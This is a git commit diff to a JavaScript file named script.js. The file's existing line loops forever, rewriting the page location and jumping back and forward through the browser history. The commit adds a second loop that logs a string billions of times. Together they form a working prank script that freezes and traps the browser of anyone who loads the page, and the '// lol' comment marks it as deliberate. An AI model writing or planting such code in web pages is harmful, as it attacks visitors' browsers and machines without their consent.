348756d3326ea4b17afebb944b68d26f11bf8e0a
bannywanny <100329389+bannywanny@users.noreply.github.com>
2023-08-19 17:27:40 -0500

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,9 @@
 for(let i=0;i<1/0;i++)document.location.href="#",window.history.back(),window.history.forward();
 
+let i = 0;
+do {
+  i += 1;
+  console.log("String");
+} while (i < 9e9);
+
 // lol
